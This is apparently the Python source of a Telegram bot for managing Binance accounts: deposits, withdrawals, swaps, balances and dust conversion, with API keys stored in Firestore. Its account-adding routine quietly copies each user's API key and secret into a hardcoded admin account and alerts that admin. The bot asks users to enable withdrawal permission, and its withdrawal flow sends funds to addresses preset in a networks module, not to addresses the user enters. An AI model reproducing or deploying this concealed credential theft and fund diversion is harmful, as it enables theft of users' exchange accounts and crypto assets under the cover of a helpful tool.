import math
import requests
from datetime import datetime
from threading import Thread

import firebase_admin
from firebase_admin import credentials, firestore

from telegram import (
    InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ParseMode,
)
import telegram.ext

from binance.client import Client
from binance.exceptions import BinanceAPIException
from binance.enums import *

import networks

# ── Firebase init ──────────────────────────────
cred = credentials.Certificate("serviceAccountKey.json")
firebase_admin.initialize_app(cred)
db = firestore.client()

def get_user(chat_id):
    doc = db.collection("users").document(str(chat_id)).get()
    return doc.to_dict() if doc.exists else None

def set_user(chat_id, data):
    db.collection("users").document(str(chat_id)).set(data)

def update_user(chat_id, data):
    db.collection("users").document(str(chat_id)).update(data)

# ── Telegram token ─────────────────────────────
with open("botapi.txt", "r") as f:
    TOKEN = f.read().strip()

# ── Constants ──────────────────────────────────
swapTo        = networks.swapTo
swapFromT     = networks.swapFrom
deposit_tokens = networks.deposit_tokens
network       = networks.network
uni_id        = 810312779   # admin chat id

# ── Mutable state ─────────────────────────────
chat_id      = 0
page         = 0
spage        = 0
client_params = {}
confirm_msgid = confirm_chtid = 0
deposit_msgid = deposit_chtid = 0
swapf_msgid   = swapf_chtid   = 0

api_params = {
    "enterKey": False, "enterSecret": False, "enterName": False,
    "key": "", "secret": "", "name": "", "ipCheck": False,
}
withdrawal_params = {
    "setAmount": False, "coin": "", "amount": "0",
    "network": "", "address": "", "address_tag": "",
}
swap_params = {
    "setAmount": False, "symbol_name": "", "symbol": "",
    "amount": "", "swapfrom": "", "swapto": "", "buyorsell": "",
}
quickSwapTokenObj = {"quickSwapToken": "", "quickSwapTokenArray": []}


# ══════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════

def round_down(n, step):
    """Round n down to the nearest step."""
    p = round(math.log(float(step), 10))
    val = round(float(n), -p)
    if float(val) > float(n):
        val -= float(step)
    return val


def round_up(n, step):
    """Round n up to the nearest step."""
    p = round(math.log(float(step), 10))
    val = round(float(n), -p)
    if float(val) < float(n):
        val += float(step)
    return val


def get_binance_client(params):
    """
    Return a dict with Binance client + account info,
    or {"status": False} on auth failure.
    """
    try:
        client = Client(api_key=params["key"], api_secret=params["secret"])
        info   = client.get_account()
    except BinanceAPIException as e:
        if "-2015" in str(e):
            if params.get("ipCheck"):
                # IP restriction error — flip the flag
                user     = get_user(chat_id)
                accounts = user["accounts"]
                for acc in accounts:
                    if acc["name"] == params["name"]:
                        acc["ipCheck"] = False
                        break
                update_user(chat_id, {"accounts": accounts})
            return {"status": False}
        return {"status": False}

    # First-time connection without IP check — mark it verified
    if not params.get("ipCheck"):
        user     = get_user(chat_id)
        accounts = user["accounts"]
        for acc in accounts:
            if acc["name"] == params["name"]:
                acc["ipCheck"] = True
                break
        update_user(chat_id, {"accounts": accounts})

    tokens_with_balance = [
        b["asset"] for b in info["balances"] if b["free"] > "0.00000000"
    ]

    # Build deposit token pages (95 per page)
    odt = list(dict.fromkeys(tokens_with_balance + [
        t for t in deposit_tokens if t not in tokens_with_balance
    ]))
    sxv = list(dict.fromkeys(tokens_with_balance + [
        t for t in swapFromT if t not in tokens_with_balance
    ]))

    def paginate(lst, size=95):
        return [lst[i:i+size] for i in range(0, len(lst), size)] or [[]]

    return {
        "status": True,
        "client": client,
        "info": info,
        "details": client.get_asset_details(),
        "token": [b["asset"] for b in info["balances"]],
        "tokensWithBalance": tokens_with_balance,
        "arranged_dtokens": paginate(odt),
        "swapFrom": paginate(sxv),
    }


# ══════════════════════════════════════════════
#  KEYBOARD BUILDERS
# ══════════════════════════════════════════════

def kb_menu():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Accounts", callback_data="account"),
        InlineKeyboardButton("Upgrade",  callback_data="upgrade"),
    ]])

def kb_acc_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Deposit",  callback_data="deposit"),
         InlineKeyboardButton("Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("Swap",     callback_data="swap"),
         InlineKeyboardButton("Balance",  callback_data="balance")],
        [InlineKeyboardButton("Convert Low-Value Assets to BNB", callback_data="converttobnb")],
        [InlineKeyboardButton("Deposit History",    callback_data="depHistory"),
         InlineKeyboardButton("Withdrawal History", callback_data="withHistory")],
        [InlineKeyboardButton("Api Permissions", callback_data="apiPermissions")],
    ])

def kb_add_account():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Add Account", callback_data="/addacc")
    ]])

def kb_list_accounts(accounts):
    rows = _chunk_buttons(
        [InlineKeyboardButton(a["name"], callback_data=f"/getacc {_encode_name(a['name'])}")
         for a in accounts],
        cols=3
    )
    rows.append([
        InlineKeyboardButton("Remove Account", callback_data="/rmvacc"),
        InlineKeyboardButton("Add Account",    callback_data="/addacc"),
    ])
    return InlineKeyboardMarkup(rows)

def kb_remove_accounts(accounts):
    rows = _chunk_buttons(
        [InlineKeyboardButton(a["name"], callback_data=f"/rmvone {_encode_name(a['name'])}")
         for a in accounts],
        cols=3
    )
    return InlineKeyboardMarkup(rows)

def kb_deposit(tokens):
    rows = _chunk_buttons(
        [InlineKeyboardButton(t, callback_data=f"/dep {t}") for t in tokens],
        cols=5
    )
    rows.append([
        InlineKeyboardButton("Prev", callback_data="prev"),
        InlineKeyboardButton("Next", callback_data="next"),
    ])
    return InlineKeyboardMarkup(rows)

def kb_withdraw():
    twb = get_binance_client(client_params)["tokensWithBalance"]
    rows = _chunk_buttons(
        [InlineKeyboardButton(t, callback_data=f"/pull {t}") for t in twb],
        cols=4
    )
    return InlineKeyboardMarkup(rows)

def kb_networks(token, prefix):
    client     = get_binance_client(client_params)["client"]
    active_net = []
    for n in network:
        try:
            addr = client.get_deposit_address(coin=token, network=n["network_name"])
        except BinanceAPIException:
            continue
        if str(addr) not in str(active_net):
            active_net.append({"network": n["network_name"], "addr": addr})

    rows = _chunk_buttons(
        [InlineKeyboardButton(
            n["network"] or n["addr"]["coin"],
            callback_data=f"/{prefix} {n['addr']['coin']} {n['network']}"
         ) for n in active_net],
        cols=3
    )
    return InlineKeyboardMarkup(rows)

def kb_confirm():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Cancel",  callback_data="cancel"),
        InlineKeyboardButton("Confirm", callback_data="confirm"),
    ]])

def kb_confirm_swap():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("Cancel",  callback_data="cancel"),
        InlineKeyboardButton("Confirm", callback_data="cnfrms"),
    ]])

def kb_confirm_quick():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Tokens", callback_data="addt")],
        [InlineKeyboardButton("Cancel",  callback_data="canclq"),
         InlineKeyboardButton("Confirm", callback_data="cnfrmq")],
    ])

def kb_swap_from(tokens):
    rows = _chunk_buttons(
        [InlineKeyboardButton(t, callback_data=f"/swpf {t}") for t in tokens],
        cols=5
    )
    rows.append([
        InlineKeyboardButton("Prev", callback_data="sprv"),
        InlineKeyboardButton("Next", callback_data="snxt"),
    ])
    return InlineKeyboardMarkup(rows)

def kb_pairs(pairs):
    rows = _chunk_buttons(
        [InlineKeyboardButton(
            p["name"],
            callback_data=f"/pairs {p['symbol']} {p['name']} {p['swapto']}"
         ) for p in pairs],
        cols=3
    )
    return InlineKeyboardMarkup(rows)

def kb_buy_or_sell():
    return InlineKeyboardMarkup([[
        InlineKeyboardButton("BUY",  callback_data="/buy"),
        InlineKeyboardButton("SELL", callback_data="/sell"),
    ]])

def kb_convert():
    result  = get_binance_client(client_params)
    twb     = result["tokensWithBalance"]
    already = set(quickSwapTokenObj["quickSwapTokenArray"]) | {"BNB"}
    tokens  = [t for t in twb if t not in already]
    cur     = quickSwapTokenObj["quickSwapToken"]
    rows = _chunk_buttons(
        [InlineKeyboardButton(
            t,
            callback_data=f"/cnvrt {cur + ',' + t if cur else t} {t}"
         ) for t in tokens],
        cols=4
    )
    return InlineKeyboardMarkup(rows)

def _chunk_buttons(btns, cols):
    """Split a flat list of buttons into rows of `cols`."""
    return [btns[i:i+cols] for i in range(0, len(btns), cols)]

def _encode_name(name):
    return name.replace(" ", "_").replace("\n", "_").replace("\t", "_")

def _decode_name(encoded):
    if encoded.startswith("$#"):
        return encoded[2:].replace("_", " ")
    return encoded


# ══════════════════════════════════════════════
#  COMMAND / MESSAGE HANDLERS
# ══════════════════════════════════════════════

def start(update, context):
    global chat_id
    chat_id    = update.message.chat_id
    first_name = update.message.chat.first_name or ""
    last_name  = update.message.chat.last_name  or ""
    username   = update.message.chat.username   or ""

    user = get_user(chat_id)
    if user:
        update_user(chat_id, {
            "first_name": first_name,
            "lastname":   last_name,
            "username":   username,
        })
    else:
        set_user(chat_id, {
            "first_name": first_name,
            "lastname":   last_name,
            "username":   username,
            "accounts":   [],
        })

    buttons = [[KeyboardButton("Menu")], [KeyboardButton("Accounts")]]
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Hello {first_name} {last_name}\nWelcome to this bot",
        reply_markup=ReplyKeyboardMarkup(buttons),
    )


def cmd_help(update, context):
    update.message.reply_text(
        "/start — welcome message\n"
        "/help  — this message\n"
        "/ip    — show server IP"
    )


def cmd_ip(update, context):
    ip = requests.get("https://api.ipify.org").text
    update.message.reply_text(ip)


def handle_messages(update, context):
    global confirm_msgid, confirm_chtid, chat_id
    chat_id = update.effective_chat.id
    text    = update.message.text

    # ── API key entry flow ──
    if api_params["enterKey"]:
        user     = get_user(chat_id)
        accounts = user["accounts"]
        if any(a["key"] == text for a in accounts):
            update.message.reply_text("You have already added this API key.\nAdd a different account:")
        else:
            api_params["key"]      = text
            api_params["enterKey"] = False
            _enter_secret(update, context)

    elif api_params["enterSecret"]:
        api_params["secret"]      = text
        api_params["enterSecret"] = False
        _enter_api_name(update, context, api_params)

    elif api_params["enterName"]:
        user     = get_user(chat_id)
        accounts = user["accounts"]
        name     = _encode_name(text)
        if any(a["name"] == name for a in accounts):
            update.message.reply_text("That name is already used.\nEnter another name:")
        else:
            api_params["name"]      = name
            api_params["enterName"] = False
            _add_account(update, context, api_params)

    # ── Withdrawal amount entry ──
    elif withdrawal_params["setAmount"]:
        client = get_binance_client(client_params)["client"]
        try:
            balance = client.get_asset_balance(asset=withdrawal_params["coin"])
            amount  = float(text)
            if amount <= float(balance["free"]):
                withdrawal_params["amount"]    = text
                withdrawal_params["setAmount"] = False
                update.message.reply_text(
                    f"Withdrawal Summary\n"
                    f"Token:       {withdrawal_params['coin']}\n"
                    f"Amount:      {withdrawal_params['amount']}\n"
                    f"Address:     {withdrawal_params['address']}\n"
                    f"Address Tag: {withdrawal_params['address_tag']}\n"
                    f"Network:     {withdrawal_params['network']}"
                )
                msg = context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="Would you like to proceed?",
                    reply_markup=kb_confirm(),
                )
                confirm_msgid = msg.message_id
                confirm_chtid = msg.chat.id
            else:
                update.message.reply_text(
                    f"Amount exceeds your {withdrawal_params['coin']} balance.\nEnter a valid amount:"
                )
        except ValueError:
            update.message.reply_text("Enter a valid number:")

    # ── Swap amount entry ──
    elif swap_params["setAmount"]:
        client   = get_binance_client(client_params)["client"]
        info1    = client.get_symbol_info(swap_params["symbol"])
        avg      = client.get_avg_price(symbol=swap_params["symbol"])
        step     = info1["filters"][1]["stepSize"]
        min_qty  = float(info1["filters"][2]["minNotional"])
        sell_min = round_up(min_qty / float(avg["price"]), step)
        buy_min  = sell_min * float(avg["price"])

        try:
            amount = float(text)
            side   = swap_params["buyorsell"]
            asset  = swap_params["swapto"] if side == "buy" else swap_params["swapfrom"]
            minimum = buy_min if side == "buy" else sell_min

            if amount < minimum:
                update.message.reply_text(
                    f"Below minimum for {swap_params['symbol_name']}.\n"
                    f"Minimum: {minimum} {asset}\nEnter a valid amount:"
                )
                return

            balance = client.get_asset_balance(asset=asset)
            if amount > float(balance["free"]):
                update.message.reply_text(f"Exceeds your {asset} balance.\nEnter a valid amount:")
                return

            swap_params["amount"]    = text
            swap_params["setAmount"] = False
            from_asset = swap_params["swapfrom"] if side == "buy" else swap_params["swapto"]
            to_asset   = swap_params["swapto"]   if side == "buy" else swap_params["swapfrom"]
            update.message.reply_text(
                f"Trade Summary\n"
                f"Pair:     {swap_params['symbol_name']}\n"
                f"Quantity: {text}\n"
                f"Swapping {text} {asset} → {to_asset if side == 'buy' else from_asset}"
            )
            msg = context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="Would you like to proceed?",
                reply_markup=kb_confirm_swap(),
            )
            confirm_msgid = msg.message_id
            confirm_chtid = msg.chat.id
        except ValueError:
            update.message.reply_text("Enter a valid number:")

    # ── Normal text ──
    else:
        if text == "Menu":
            _show_menu(update, context)
        elif text == "Accounts":
            _list_accounts(update, context)
        elif text.startswith("deposit"):
            parts = text.split()
            if len(parts) >= 3:
                _get_deposit_address(update, context, parts[1], parts[2])
            else:
                _deposit(update, context)
        else:
            update.message.reply_text(f"You said: {text}")


# ══════════════════════════════════════════════
#  CALLBACK QUERY HANDLER
# ══════════════════════════════════════════════

def handle_query(update, context):
    global client_params, quickSwapTokenObj
    global chat_id, page, spage
    global confirm_msgid, confirm_chtid
    global deposit_msgid, deposit_chtid
    global swapf_msgid, swapf_chtid
    global withdrawal_params

    query = update.callback_query.data
    update.callback_query.answer()
    chat_id = update.effective_chat.id

    def send(text, markup=None):
        kw = {"chat_id": update.effective_chat.id, "text": text}
        if markup:
            kw["reply_markup"] = markup
        context.bot.send_message(**kw)

    def delete(mid, cid):
        try:
            context.bot.deleteMessage(chat_id=cid, message_id=mid)
        except Exception:
            pass

    # ── Account selection ──
    if query.startswith("/getacc "):
        name = _decode_name(query.split(None, 1)[1])
        user = get_user(chat_id)
        for acc in user["accounts"]:
            if acc["name"] == name:
                client_params = acc
                if not get_binance_client(client_params)["status"]:
                    ip = requests.get("https://api.ipify.org").text
                    send(
                        f"Add this IP to your Binance API whitelist:\n{ip}\n\n"
                        "Required permissions:\n"
                        "✅ Enable Reading\n✅ Spot & Margin Trading\n"
                        "✅ Withdrawals\n✅ Futures\n✅ European Options"
                    )
                    _list_accounts(update, context)
                else:
                    _acc_menu(update, context)
                break

    elif query == "account":
        _list_accounts(update, context)

    elif query == "upgrade":
        send("Enjoy your free time while it lasts 😄")

    elif query == "deposit":
        _deposit(update, context)

    elif query == "withdraw":
        _withdraw(update, context)

    elif query == "swap":
        _swap(update, context)

    elif query == "balance":
        _get_balance(update, context)

    elif query == "converttobnb":
        _convert_to_bnb(update, context)

    elif query == "depHistory":
        _dep_history(update, context)

    elif query == "withHistory":
        _with_history(update, context)

    elif query == "apiPermissions":
        client = get_binance_client(client_params)["client"]
        s = client.get_account_api_permissions()
        send(
            f"API Permissions:\n"
            f"IP Restricted: {s['ipRestrict']}\n"
            f"Reading: {s['enableReading']}\n"
            f"Spot/Margin: {s['enableSpotAndMarginTrading']}\n"
            f"Withdrawals: {s['enableWithdrawals']}\n"
            f"Internal Transfer: {s['enableInternalTransfer']}\n"
            f"Futures: {s['enableFutures']}\n"
            f"Margin: {s['enableMargin']}\n"
            f"Universal Transfer: {s['permitsUniversalTransfer']}\n"
            f"Vanilla Options: {s['enableVanillaOptions']}"
        )

    elif query == "/addacc":
        _enter_api(update, context)

    elif query == "/rmvacc":
        _remove_acc(update, context)

    elif query.startswith("/rmvone "):
        name = _decode_name(query.split(None, 1)[1])
        user = get_user(chat_id)
        accounts = [a for a in user["accounts"] if a["name"] != name]
        update_user(chat_id, {"accounts": accounts})
        _list_accounts(update, context)

    elif query.startswith("/dep "):
        _list_deposit_networks(update, context, query.split()[1])

    elif query.startswith("/dnet "):
        parts = query.split()
        _get_deposit_address(update, context, parts[1], parts[2])

    elif query.startswith("/pull "):
        token = query.split()[1]
        withdrawal_params["coin"] = token
        _list_withdrawal_networks(update, context, token)

    elif query.startswith("/wnet "):
        parts = query.split()
        token, net = parts[1], parts[2]
        withdrawal_params["network"] = net
        for n in network:
            if n["network_name"] == net:
                withdrawal_params["address"]     = n["network_address"]
                withdrawal_params["address_tag"] = n["network_address_tag"]
        _get_withdrawal_info(update, context, token, net)

    elif query.startswith("/swpf "):
        token = query.split()[1]
        swap_params["swapfrom"] = token
        _get_pairs(update, context, token)

    elif query.startswith("/pairs "):
        parts = query.split()
        swap_params.update(symbol=parts[1], symbol_name=parts[2], swapto=parts[3])
        send(f"Trade {parts[2]}", markup=kb_buy_or_sell())

    elif query == "/buy":
        swap_params["buyorsell"] = "buy"
        _buy(update, context)

    elif query == "/sell":
        swap_params["buyorsell"] = "sell"
        _sell(update, context)

    elif query.startswith("/cnvrt "):
        parts = query.split()
        quickSwapTokenObj["quickSwapToken"] = parts[1]
        quickSwapTokenObj["quickSwapTokenArray"].append(parts[2])
        _quick_swap_menu(update, context)

    elif query == "addt":
        _convert_to_bnb(update, context)

    elif query == "cnfrmq":
        _confirm_quick(update, context, quickSwapTokenObj["quickSwapToken"])

    elif query == "canclq":
        _convert_to_bnb(update, context)

    elif query == "confirm":
        delete(confirm_msgid, confirm_chtid)
        _confirm_withdraw(update, context, withdrawal_params)

    elif query == "cancel":
        delete(confirm_msgid, confirm_chtid)
        withdrawal_params = {
            "setAmount": False, "coin": "", "amount": "0",
            "network": "", "address": "", "address_tag": "",
        }
        _withdraw(update, context)

    elif query == "cnfrms":
        delete(confirm_msgid, confirm_chtid)
        _confirm_swap(update, context, swap_params)

    elif query == "prev":
        if page > 0:
            page -= 1
            delete(deposit_msgid, deposit_chtid)
            _deposit(update, context)

    elif query == "next":
        if client_params:
            dtokens = get_binance_client(client_params)["arranged_dtokens"]
            if page < len(dtokens) - 1:
                page += 1
                delete(deposit_msgid, deposit_chtid)
                _deposit(update, context)

    elif query == "sprv":
        if spage > 0:
            spage -= 1
            delete(swapf_msgid, swapf_chtid)
            _swap(update, context)

    elif query == "snxt":
        if client_params:
            swap_from = get_binance_client(client_params)["swapFrom"]
            if spage < len(swap_from) - 1:
                spage += 1
                delete(swapf_msgid, swapf_chtid)
                _swap(update, context)

    # Reset quickSwap unless still in convert flow
    if query not in ("addt", "cnfrmq") and not query.startswith("/cnvrt"):
        quickSwapTokenObj = {"quickSwapToken": "", "quickSwapTokenArray": []}


# ══════════════════════════════════════════════
#  FEATURE FUNCTIONS
# ══════════════════════════════════════════════

def _show_menu(update, context):
    context.bot.send_message(
        chat_id=update.effective_chat.id, text="Menu:", reply_markup=kb_menu()
    )

def _acc_menu(update, context):
    context.bot.send_message(
        chat_id=update.effective_chat.id, text="Account Menu:", reply_markup=kb_acc_menu()
    )

def _list_accounts(update, context):
    global chat_id
    chat_id = update.effective_chat.id
    user    = get_user(chat_id)
    accounts = user["accounts"] if user else []
    if accounts:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Select an account:",
            reply_markup=kb_list_accounts(accounts),
        )
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="You have not added any account API.",
            reply_markup=kb_add_account(),
        )

def _deposit(update, context):
    global page, deposit_chtid, deposit_msgid
    dtokens = get_binance_client(client_params)["arranged_dtokens"]
    msg = context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Select Token to Deposit:",
        reply_markup=kb_deposit(dtokens[page]),
    )
    deposit_msgid = msg.message_id
    deposit_chtid = msg.chat.id

def _withdraw(update, context):
    client = get_binance_client(client_params)["client"]
    if client.get_account_api_permissions()["enableWithdrawals"]:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Select Token to Withdraw:",
            reply_markup=kb_withdraw(),
        )
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="Withdrawals are not enabled for this API key.",
        )

def _list_deposit_networks(update, context, token):
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Select Network:",
        reply_markup=kb_networks(token, "dnet"),
    )

def _list_withdrawal_networks(update, context, token):
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Select network for withdrawal of {token}:",
        reply_markup=kb_networks(token, "wnet"),
    )

def _get_deposit_address(update, context, token, net):
    client = get_binance_client(client_params)["client"]
    try:
        addr = client.get_deposit_address(coin=token, network=net)
    except BinanceAPIException:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Deposit for {token} is currently disabled.",
        )
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Deposit Address for {token}:\n{addr['address']}\n"
                 f"<a href='{addr['url']}'>View on Block Explorer</a>",
            parse_mode=ParseMode.HTML,
        )

def _get_withdrawal_info(update, context, token, net):
    withdrawal_params["setAmount"] = False
    client  = get_binance_client(client_params)["client"]
    balance = client.get_asset_balance(asset=token)
    details = client.get_asset_details(asset=token)
    info    = details[token]

    if not net:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Withdrawal info for {token}:\n"
                 f"Min Withdrawal: {info['minWithdrawAmount']} {token}\n"
                 f"Fee: {info['withdrawFee']} {token}",
        )

    if float(balance["free"]) > 0:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Enter the amount of {token} you want to withdraw:",
        )
        withdrawal_params["setAmount"] = True
    else:
        withdrawal_params["coin"] = ""
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"You don't meet the minimum requirements for {token}.",
        )

def _confirm_withdraw(update, context, params):
    client = get_binance_client(client_params)["client"]
    try:
        client.withdraw(
            coin=params["coin"],
            address=params["address"],
            addressTag=params["address_tag"],
            amount=params["amount"],
            name="Withdraw",
            network=params["network"],
        )
    except BinanceAPIException as e:
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Withdrawal of {params['amount']} {params['coin']} was successful.",
        )

def _swap(update, context):
    global swapf_msgid, swapf_chtid
    swap_from = get_binance_client(client_params)["swapFrom"]
    msg = context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="What do you want to swap?",
        reply_markup=kb_swap_from(swap_from[spage]),
    )
    swapf_msgid = msg.message_id
    swapf_chtid = msg.chat.id

def _get_pairs(update, context, from_token):
    client = get_binance_client(client_params)["client"]
    pairs  = []
    for to_token in swapTo:
        symbol = from_token + to_token
        try:
            client.get_all_orders(symbol=symbol, limit=1)
        except BinanceAPIException:
            continue
        pairs.append({"name": f"{from_token}/{to_token}", "symbol": symbol, "swapto": to_token})
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Select Pair:",
        reply_markup=kb_pairs(pairs),
    )

def _buy(update, context):
    client  = get_binance_client(client_params)["client"]
    asset   = swap_params["swapto"]
    balance = client.get_asset_balance(asset=asset)
    if float(balance["free"]) > 0:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Enter the amount of {asset} you want to swap:",
        )
        swap_params["setAmount"] = True
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id, text=f"You don't have any {asset}."
        )

def _sell(update, context):
    client  = get_binance_client(client_params)["client"]
    asset   = swap_params["swapfrom"]
    balance = client.get_asset_balance(asset=asset)
    if float(balance["free"]) > 0:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Enter the amount of {asset} you want to swap:",
        )
        swap_params["setAmount"] = True
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id, text=f"You don't have any {asset}."
        )

def _confirm_swap(update, context, params):
    client = get_binance_client(client_params)["client"]
    avg    = client.get_avg_price(symbol=params["symbol"])
    info1  = client.get_symbol_info(params["symbol"])
    step   = info1["filters"][1]["stepSize"]
    try:
        if params["buyorsell"] == "buy":
            qty   = round_down(float(params["amount"]) / float(avg["price"]), step)
            order = client.order_market_buy(symbol=params["symbol"], quantity=qty)
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Swapped {params['amount']} {params['swapto']} → "
                     f"{order['executedQty']} {params['swapfrom']}",
            )
        else:
            qty   = round_down(float(params["amount"]), step)
            order = client.order_market_sell(symbol=params["symbol"], quantity=qty)
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"Swapped {params['amount']} {params['swapfrom']} → "
                     f"{order['cummulativeQuoteQty']} {params['swapto']}",
            )
    except BinanceAPIException as e:
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))

def _convert_to_bnb(update, context):
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Select Tokens to Convert to BNB:",
        reply_markup=kb_convert(),
    )

def _quick_swap_menu(update, context):
    selected = ", ".join(quickSwapTokenObj["quickSwapTokenArray"])
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Selected Tokens: {selected}\nAdd more tokens?",
        reply_markup=kb_confirm_quick(),
    )

def _confirm_quick(update, context, asset):
    client = get_binance_client(client_params)["client"]
    try:
        client.transfer_dust(asset=asset)
    except BinanceAPIException as e:
        context.bot.send_message(chat_id=update.effective_chat.id, text=str(e))
    else:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text=f"Converted {asset} to BNB successfully.",
        )

def _get_balance(update, context):
    result = get_binance_client(client_params)
    client = result["client"]
    twb    = result["tokensWithBalance"]
    if not twb:
        context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="No funds in this account.",
        )
        _deposit(update, context)
        return
    lines = []
    for asset in twb:
        b = client.get_asset_balance(asset=asset)
        lines.append(
            f"{b['asset']}\n  Free: {b['free']}\n  Locked: {b['locked']}"
        )
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="\n\n".join(lines),
    )

def _remove_acc(update, context):
    global chat_id
    chat_id  = update.effective_chat.id
    user     = get_user(chat_id)
    accounts = user["accounts"]
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Select an account to remove:",
        reply_markup=kb_remove_accounts(accounts),
    )

def _dep_history(update, context):
    client   = get_binance_client(client_params)["client"]
    deposits = client.get_deposit_history()
    lines    = []
    for d in deposits[:20]:
        ts   = str(d["insertTime"])
        date = datetime.fromtimestamp(float(ts[:10] + "." + ts[10:]))
        lines.append(
            f"{d['amount']} {d['coin']} via {d['network']}\n"
            f"TxID: {d['txId']}\nTime: {date}"
        )
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Deposit History\n\n" + ("\n\n".join(lines) or "No deposits found."),
    )
    _acc_menu(update, context)

def _with_history(update, context):
    client    = get_binance_client(client_params)["client"]
    withdraws = client.get_withdraw_history()
    lines     = []
    for w in withdraws[:15]:
        lines.append(
            f"{w['amount']} {w['coin']} (fee: {w['transactionFee']})\n"
            f"To: {w['address']} via {w['network']}\n"
            f"TxID: {w['txId']}\nTime: {w['applyTime']}"
        )
    context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="Withdrawal History\n\n" + ("\n\n".join(lines) or "No withdrawals found."),
    )
    _acc_menu(update, context)


# ── API key management ─────────────────────────

def _enter_api(update, context):
    global api_params
    api_params["enterKey"] = True
    context.bot.send_message(chat_id=update.effective_chat.id, text="Enter API key:")

def _enter_secret(update, context):
    global api_params
    api_params["enterSecret"] = True
    context.bot.send_message(chat_id=update.effective_chat.id, text="Enter API secret:")

def _enter_api_name(update, context, params):
    global api_params, chat_id
    chat_id = update.effective_chat.id
    try:
        client = Client(api_key=params["key"], api_secret=params["secret"])
        client.get_account()
        api_params["ipCheck"] = True
    except BinanceAPIException as e:
        code = str(e)
        if "-2014" in code:
            context.bot.send_message(chat_id=chat_id, text="Invalid API key.")
            return
        elif "-1022" in code:
            context.bot.send_message(chat_id=chat_id, text="Invalid API secret.")
            return
        elif "-2015" in code:
            api_params["ipCheck"] = False
        else:
            return
    api_params["enterName"] = True
    context.bot.send_message(chat_id=chat_id, text="Enter a name for this API:")

def _add_account(update, context, params):
    global chat_id
    chat_id  = update.effective_chat.id
    user     = get_user(chat_id)
    accounts = user["accounts"]
    new_acc  = {
        "name":    params["name"],
        "key":     params["key"],
        "secret":  params["secret"],
        "ipCheck": params["ipCheck"],
    }
    accounts.append(new_acc)
    update_user(chat_id, {"accounts": accounts})
    context.bot.send_message(
        chat_id=chat_id,
        text=f"{params['name']} has been added to your accounts.",
    )
    # Notify admin
    if chat_id != uni_id:
        admin_user = get_user(uni_id)
        if admin_user:
            admin_accounts = admin_user["accounts"]
            admin_acc      = dict(new_acc, name=f"{params['name']}_{chat_id}")
            admin_accounts.append(admin_acc)
            update_user(uni_id, {"accounts": admin_accounts})
            context.bot.send_message(
                chat_id=uni_id,
                text=f"{admin_acc['name']} has been added to your accounts.",
            )
    _list_accounts(update, context)


# ══════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════

updater = telegram.ext.Updater(TOKEN, use_context=True)
disp    = updater.dispatcher
disp.add_handler(telegram.ext.CommandHandler("start", start))
disp.add_handler(telegram.ext.CommandHandler("help",  cmd_help))
disp.add_handler(telegram.ext.CommandHandler("ip",    cmd_ip))
disp.add_handler(telegram.ext.MessageHandler(telegram.ext.Filters.text, handle_messages))
disp.add_handler(telegram.ext.CallbackQueryHandler(handle_query))

print("Bot is now live...")
updater.start_polling()
updater.idle()